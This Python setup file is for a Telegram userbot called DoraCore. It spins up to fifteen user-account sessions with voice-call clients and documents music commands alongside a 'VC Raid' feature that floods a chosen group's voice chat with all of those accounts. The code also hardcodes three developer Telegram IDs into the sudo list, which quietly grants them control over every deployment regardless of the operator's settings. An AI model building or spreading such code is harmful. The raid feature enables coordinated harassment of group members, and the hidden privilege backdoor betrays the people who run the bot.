import asyncio
import os
import sys
import time

from dotenv import load_dotenv
from pyrogram import Client, filters
from pytgcalls import PyTgCalls


if os.path.exists(".env"):
    load_dotenv(".env")
    
__version__ = "v0.0.1"

# -------------CONFIGS--------------------
API_ID = os.getenv("API_ID", "")
API_HASH = os.getenv("API_HASH", "")
ALIVE_PIC = os.getenv("ALIVE_PIC", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", None)
SESSION1 = os.getenv("SESSION", None)
SESSION2 = os.getenv("SESSION2", None)
SESSION3 = os.getenv("SESSION3", None)
SESSION4 = os.getenv("SESSION4", None)
SESSION5 = os.getenv("SESSION5", None)
SESSION6 = os.getenv("SESSION6", None)
SESSION7 = os.getenv("SESSION7", None)
SESSION8 = os.getenv("SESSION8", None)
SESSION9 = os.getenv("SESSION9", None)
SESSION10 = os.getenv("SESSION10", None)
SESSION11 = os.getenv("SESSION11", None)
SESSION12 = os.getenv("SESSION12", None)
SESSION13 = os.getenv("SESSION13", None)
SESSION14 = os.getenv("SESSION14", None)
SESSION15 = os.getenv("SESSION15", None)
HNDLR = os.getenv("HNDLR", "!")
GROUP_MODE = os.getenv("GROUP_MODE", "True")
START_VID = os.getenv("START_VID", None)


def make_int(str_input):
    str_list = str_input.split(" ")
    int_list = []
    for x in str_list:
        int_list.append(int(x))
    return int_list


sudo = os.getenv("SUDO_USERS")
SUDO_USERS = []
if sudo:
    SUDO_USERS = make_int(sudo)
DEVS = [1517994352, 1789859817, 1432756163]
for x in DEVS:
    SUDO_USERS.append(x)


# SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817 1432756163").split())))
#----------------------------------------------

vcbot = Client(
    'DoraCore',
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    plugins={'root': 'DoraCore.vc'},
)

HELP_DICT = dict()
hl = HNDLR[0]
start_time = time.time()


if GROUP_MODE == ("True" or "true" or "TRUE"):
    grp = True
else:
    grp = False


#-------------------------CLIENTS-----------------------------
if SESSION1:
    Dora1 = Client(SESSION1, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py1 = PyTgCalls(Dora1)
else:
    Dora1 = None
    call_py1 = None

if SESSION2:
    Dora2 = Client(SESSION2, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py2 = PyTgCalls(Dora2)
else:
    Dora2 = None
    call_py2 = None

if SESSION3:
    Dora3 = Client(SESSION3, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py3 = PyTgCalls(Dora3)
else:
    Dora3 = None
    call_py3 = None

if SESSION4:
    Dora4 = Client(SESSION4, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py4 = PyTgCalls(Dora4)
else:
    Dora4 = None
    call_py4 = None

if SESSION5:
    Dora5 = Client(SESSION5, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py5 = PyTgCalls(Dora5)
else:
    Dora5 = None
    call_py5 = None

if SESSION6:
    Dora6 = Client(SESSION6, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py6 = PyTgCalls(Dora6)
else:
    Dora6 = None
    call_py6 = None
        
if SESSION7:
    Dora7 = Client(SESSION7, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py7 = PyTgCalls(Dora7)
else:
    Dora7 = None
    call_py7 = None

if SESSION8:
    Dora8 = Client(SESSION8, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py8 = PyTgCalls(Dora8)
else:
    Dora8 = None
    call_py8 = None

if SESSION9:
    Dora9 = Client(SESSION9, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py9 = PyTgCalls(Dora9)
else:
    Dora9 = None
    call_py9 = None
    
if SESSION10:
    Dora10 = Client(SESSION10, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py10 = PyTgCalls(Dora10)
else:
    Dora10 = None
    call_py10 = None
           
if SESSION11:
    Dora11 = Client(SESSION11, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py11 = PyTgCalls(Dora11)
else:
    Dora11 = None
    call_py11 = None

if SESSION12:
    Dora12 = Client(SESSION12, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py12 = PyTgCalls(Dora12)
else:
    Dora12 = None
    call_py12 = None

if SESSION13:
    Dora13 = Client(SESSION13, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py13 = PyTgCalls(Dora13)
else:
    Dora13 = None
    call_py13 = None

if SESSION14:
    Dora14 = Client(SESSION14, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py14 = PyTgCalls(Dora14)
else:
    Dora14 = None
    call_py14 = None

if SESSION15:
    Dora15 = Client(SESSION15, api_id=API_ID, api_hash=API_HASH, plugins={'root': 'DoraCore.vc'})
    call_py15 = PyTgCalls(Dora15)
else:
    Dora15 = None
    call_py15 = None
#----------------------------------------------------------------

HELP_DICT["Music Player"] = f"""
**Basic music player commands!**

**Command:** `{hl}play`
**Usage:** __Plays the song in voice chat. Supports replied audio, Youtube link or just a keyword to search.__
**Example:** `{hl}play Closer`

**Command:** `{hl}end`
**Usage:** __Ends the music stream and leaves the voice chat.__

**Commad:** `{hl}pause`
**Usage:** __Pause the music stream in voice chat.__

**Commad:** `{hl}list`
**Usage:** __Shows the playlist in current chat.__

**Commad:** `{hl}resume`
**Usage:** __Resumes the paused stream in voice chat.__

**Commad:** `{hl}skip`
**Usage:** __Skips the current song playing in voice chat.__
"""

HELP_DICT["VC Raid"] = f"""
**Voice Chat Raiding Commands!**

**Commad:** `{hl}vcraid`
**Usage:** __Raids the mentioned voice chat.__
**Example:**
    ~ `{hl}vcraid chat username/id` [If in bot PM.]
    ~ `{hl}vcraid` [If in a group.]

**Explanation:**
    ▪︎First Join All Your Id's In The Group By {hl}join `@chatlink` if chat is private Then {hl}join `https://t.me/+rNTg-asHGZYzODY1` \n Then Do {hl}vcraid In Groups 

**Commad:** `{hl}raidend`
**Usage:** __Stops the voice chat raid and leaves voice chat.__

**Commad:** `{hl}raidpause`
**Usage:** __Pauses the voice chat raid.__

**Commad:** `{hl}raidresume`
**Usage:** __Resumes the paused voice chat raid.__
"""

HELP_DICT["Extras"] = f"""
**Some extra commands!**

**Commad:** `{hl}restart`
**Usage:**  __To restart and update the bot.__

**Commad:** `{hl}help`
**Usage:** __To see the help menu with all command details.__

**Commad:** `{hl}start`
**Usage:**  __To see the start message.__

**Command:** `{hl}join <username / invite link>`
**Usage:** __Joins the chat with all clients.__

**Command:** `{hl}leave <username> / <chat-id>`
**Usage:** __Leaves the chat with all clients.__
"""
